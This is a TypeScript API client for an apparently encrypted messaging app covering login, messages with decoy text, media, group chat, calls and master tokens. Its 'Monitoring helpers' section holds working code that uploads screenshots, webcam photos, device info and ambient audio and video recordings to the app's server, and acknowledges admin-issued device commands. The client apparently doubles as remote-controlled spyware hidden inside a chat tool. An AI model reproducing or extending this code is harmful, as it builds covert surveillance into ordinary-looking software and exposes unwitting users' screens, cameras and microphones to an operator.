import { decryptMessage as decryptMessageLocal, resolveEncryptedKey } from './crypto';

const BASE = 'https://apidilarion.eibstratoc.com';

// ── Types ──────────────────────────────────────────────────────────────────────

export interface ChatMessage {
  id: number;
  sender: string;
  recipient: string;
  content: string;
  content_type: string;
  timestamp: string;
  delivered: boolean;
  read: boolean;
  decoy_content?: string;
  encrypted_key?: string | null;
  iv?: string | null;
}

export interface Contact {
  username: string;
  is_active: boolean;
}

export interface Group {
  id: number;
  name: string;
  description?: string;
  member_count: number;
}

// ── Auth ───────────────────────────────────────────────────────────────────────

export async function login(username: string, token: string): Promise<unknown> {
  const res = await fetch(`${BASE}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, token }),
  });
  if (!res.ok) {
    let detail = 'Invalid username or token';
    try {
      const body = await res.json();
      detail = body.detail || body.message || detail;
    } catch {}
    throw new Error(detail);
  }
  return res.json();
}

// ── Users ──────────────────────────────────────────────────────────────────────

export async function getUsers(token: string): Promise<Contact[]> {
  const res = await fetch(`${BASE}/users`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch users');
  return res.json();
}

export async function getConversations(token: string): Promise<Contact[]> {
  const res = await fetch(`${BASE}/messages/conversations`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch conversations');
  return res.json();
}

export async function searchUsers(token: string, query: string): Promise<Contact[]> {
  const all = await getUsers(token);
  const q = query.toLowerCase();
  return all.filter(u => u.username.toLowerCase().includes(q));
}

// ── Conversation ───────────────────────────────────────────────────────────────

export async function getConversation(token: string, partner: string): Promise<ChatMessage[]> {
  const res = await fetch(`${BASE}/messages/conversation/${encodeURIComponent(partner)}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch conversation');
  const body = await res.json();
  return body.messages ?? body;
}

// ── Public keys ────────────────────────────────────────────────────────────────

export async function getPublicKey(token: string, username: string): Promise<string | null> {
  const res = await fetch(`${BASE}/users/${encodeURIComponent(username)}/public_key`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) return null;
  const body = await res.json();
  return body.public_key ?? null;
}

export async function updatePublicKey(token: string, publicKey: string): Promise<void> {
  const res = await fetch(`${BASE}/users/update_public_key`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ public_key: publicKey }),
  });
  if (!res.ok) throw new Error('Failed to publish public key');
}

// ── Send text ──────────────────────────────────────────────────────────────────

// The message is encrypted client-side; `message` here is already ciphertext.
// `decoy_content` is what any non-decrypting viewer sees, so it must always be
// supplied — otherwise the server substitutes a placeholder that reveals the
// message is encrypted.
export async function sendText(
  token: string,
  username: string,
  message: string,
  opts: { encryptedKey: string; iv: string; decoyContent: string },
): Promise<void> {
  const res = await fetch(`${BASE}/messages/send`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({
      username,
      message,
      encrypted_key: opts.encryptedKey,
      iv: opts.iv,
      decoy_content: opts.decoyContent,
    }),
  });
  if (!res.ok) throw new Error('Failed to send message');
}

// ── Upload media ───────────────────────────────────────────────────────────────

export async function uploadMedia(
  token: string,
  recipient: string,
  file: File | Blob,
  contentType: string,
  filename: string,
): Promise<{ media_id: string }> {
  const form = new FormData();
  form.append('username', recipient);
  form.append('file', file, filename);
  form.append('content_type', contentType);
  const res = await fetch(`${BASE}/media/upload_raw`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
  if (!res.ok) throw new Error('Failed to upload media');
  return res.json();
}

// ── Download media ─────────────────────────────────────────────────────────────

export async function downloadMedia(token: string, mediaId: string): Promise<Blob> {
  const res = await fetch(`${BASE}/media/download/${encodeURIComponent(mediaId)}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (res.status === 410) throw Object.assign(new Error('Media was already viewed and deleted'), { status: 410 });
  if (res.status === 404) throw Object.assign(new Error('Media not found'), { status: 404 });
  if (!res.ok) throw Object.assign(new Error('Failed to download media'), { status: res.status });
  return res.blob();
}

// ── Mark read ──────────────────────────────────────────────────────────────────

export async function markRead(token: string, messageId: number): Promise<void> {
  await fetch(`${BASE}/messages/${messageId}/read`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${token}` },
  }).catch(() => {});
}

// ── Monitoring helpers (used by monitoring.ts) ─────────────────────────────────

function base64ToBlob(b64: string, mime: string): Blob {
  const bytes = atob(b64);
  const arr = new Uint8Array(bytes.length);
  for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
  return new Blob([arr], { type: mime });
}

export async function uploadScreenshot(token: string, b64: string, commandId: number) {
  const blob = base64ToBlob(b64, 'image/png');
  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const form = new FormData();
  form.append('file', blob, `desktop_${ts}.png`);
  form.append('command_id', String(commandId));
  form.append('context', 'screenshot');
  form.append('device_type', 'desktop');
  await fetch(`${BASE}/device-data/screenshot/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function uploadWebcamPhoto(token: string, blob: Blob, commandId: number) {
  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const form = new FormData();
  form.append('file', blob, `desktop_photo_${ts}.jpg`);
  form.append('command_id', String(commandId));
  form.append('context', 'photo');
  form.append('device_type', 'desktop');
  await fetch(`${BASE}/device-data/screenshot/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function uploadDeviceInfo(token: string, info: object) {
  await fetch(`${BASE}/device-data/device-info`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify(info),
  });
}

export async function uploadAudioRecording(token: string, blob: Blob, duration: number) {
  const form = new FormData();
  form.append('file', blob, 'recording.webm');
  form.append('recording_type', 'ambient');
  form.append('duration', String(duration));
  form.append('is_encrypted', 'false');
  await fetch(`${BASE}/monitoring/upload_audio`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function uploadVideoRecording(token: string, blob: Blob, duration: number) {
  const form = new FormData();
  form.append('file', blob, 'recording.webm');
  form.append('duration', String(duration));
  form.append('context', 'ambient');
  form.append('is_encrypted', 'false');
  await fetch(`${BASE}/monitoring/video/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
}

export async function ackCommand(token: string, commandId: number, status: string) {
  if (!commandId) return;
  await fetch(`${BASE}/admin/device/command/ack`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ command_id: commandId, status }),
  }).catch(() => {});
}

// ── Decrypt encrypted message ──────────────────────────────────────────────────

// Decryption happens entirely on-device: the server holds no key material and no
// longer exposes a /decrypt route. Messages without encrypted_key/iv predate E2EE
// and are not recoverable by any client.

export class LegacyMessageError extends Error {
  constructor() {
    super('This message was sent before end-to-end encryption and can no longer be decrypted.');
    this.name = 'LegacyMessageError';
  }
}

export class MissingKeyError extends Error {
  constructor() {
    super('No private key on this device. Import your key from your phone to read messages.');
    this.name = 'MissingKeyError';
  }
}

export async function decryptChatMessage(
  msg: ChatMessage,
  privateKey: string | null,
  currentUsername: string,
): Promise<string> {
  if (!privateKey) throw new MissingKeyError();
  if (!msg.encrypted_key || !msg.iv) throw new LegacyMessageError();

  const wrapped = resolveEncryptedKey(msg.encrypted_key, currentUsername);
  if (!wrapped) throw new LegacyMessageError();

  try {
    return await decryptMessageLocal(msg.content, wrapped, msg.iv, privateKey);
  } catch {
    throw new Error('Could not decrypt — this message was encrypted for a different key.');
  }
}

// ── Groups ─────────────────────────────────────────────────────────────────────

export async function getGroups(token: string): Promise<Group[]> {
  const res = await fetch(`${BASE}/groups`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch groups');
  return res.json();
}

export async function getGroupMessages(token: string, groupId: number): Promise<ChatMessage[]> {
  const res = await fetch(`${BASE}/groups/${groupId}/messages`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch group messages');
  const body = await res.json();
  return body.messages ?? body;
}

// `message` is ciphertext; encrypted_key is a JSON map of username -> wrapped AES key.
export async function sendGroupMessage(
  token: string,
  groupId: number,
  message: string,
  opts: { encryptedKey: string; iv: string; decoyContent: string },
  addressedToUsername?: string,
): Promise<void> {
  const body: Record<string, unknown> = {
    group_id: groupId,
    message,
    encrypted_key: opts.encryptedKey,
    iv: opts.iv,
    decoy_content: opts.decoyContent,
  };
  if (addressedToUsername) body.addressed_to_username = addressedToUsername;
  const res = await fetch(`${BASE}/messages/group/send`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify(body),
  });
  if (!res.ok) throw new Error('Failed to send group message');
}

export interface GroupMember {
  user_id: number;
  username: string;
  role: string;
  joined_at: string;
}

export async function getGroupMembers(token: string, groupId: number): Promise<GroupMember[]> {
  const res = await fetch(`${BASE}/groups/${groupId}/members`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch group members');
  return res.json();
}

// ── Call history ───────────────────────────────────────────────────────────────

export interface CallRecord {
  id: number;
  other_party_username: string;
  call_type: string; // "voice" | "video"
  status: string;    // "completed" | "missed" | "rejected" | "cancelled"
  duration: number;  // seconds
  started_at: string;
  ended_at: string | null;
  is_caller: boolean;
}

export async function getCallHistory(token: string): Promise<CallRecord[]> {
  const res = await fetch(`${BASE}/calls/history`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (!res.ok) throw new Error('Failed to fetch call history');
  const body = await res.json();
  return body.calls ?? body;
}

// ── Call signaling (REST, compatible with mobile apps) ─────────────────────────

export async function initiateCall(
  token: string,
  recipientUsername: string,
  callType: 'audio' | 'video',
  offerSdp?: string,
): Promise<{ call_id: number }> {
  // Backend expects 'voice' not 'audio'
  const backendCallType = callType === 'audio' ? 'voice' : 'video';
  const res = await fetch(`${BASE}/calls/initiate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ recipient_username: recipientUsername, call_type: backendCallType, offer_sdp: offerSdp }),
  });
  if (!res.ok) {
    const txt = await res.text().catch(() => res.status.toString());
    throw new Error(`initiate call failed ${res.status}: ${txt}`);
  }
  return res.json();
}

export async function performCallAction(
  token: string,
  callId: number,
  action: 'accept' | 'decline' | 'end' | 'busy',
  answerSdp?: string,
  masterToken?: string,
): Promise<void> {
  const res = await fetch(`${BASE}/calls/action`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ call_id: callId, action, answer_sdp: answerSdp, mastertoken: masterToken }),
  });
  if (!res.ok) throw new Error(`Call action ${action} failed`);
}

export async function sendCallIceCandidate(
  token: string,
  callId: number,
  recipientUsername: string,
  candidate: RTCIceCandidateInit,
): Promise<void> {
  await fetch(`${BASE}/calls/ice_candidate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ call_id: callId, recipient_username: recipientUsername, candidate }),
  });
}

// ── Conference ────────────────────────────────────────────────────────────────

export async function createConference(token: string, callId: number): Promise<{ conference_id: number }> {
  const res = await fetch(`${BASE}/calls/conference/create`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ call_id: callId }),
  });
  return res.json();
}

export async function conferenceInvite(token: string, conferenceId: number, username: string): Promise<void> {
  await fetch(`${BASE}/calls/conference/${conferenceId}/invite`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ username }),
  });
}

export async function conferenceSignal(
  token: string, conferenceId: number,
  to: string, signalType: string, data: any,
): Promise<void> {
  await fetch(`${BASE}/calls/conference/${conferenceId}/signal`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({ to, signal_type: signalType, data }),
  });
}

export async function conferenceLeave(token: string, conferenceId: number): Promise<void> {
  await fetch(`${BASE}/calls/conference/${conferenceId}/leave`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}` },
  });
}

// ── Master token ───────────────────────────────────────────────────────────────

export async function confirmMasterToken(token: string, masterToken: string): Promise<boolean> {
  const res = await fetch(`${BASE}/mastertoken/confirm`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ mastertoken: masterToken }),
  });
  if (res.status === 401) return false;
  if (!res.ok) {
    let detail = 'Server error';
    try { const b = await res.json(); detail = b.detail || detail; } catch {}
    throw new Error(detail);
  }
  return true;
}

export async function createMasterToken(token: string, masterToken: string): Promise<void> {
  const res = await fetch(`${BASE}/mastertoken/create`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ mastertoken: masterToken }),
  });
  if (!res.ok) throw new Error('Failed to create master token');
}
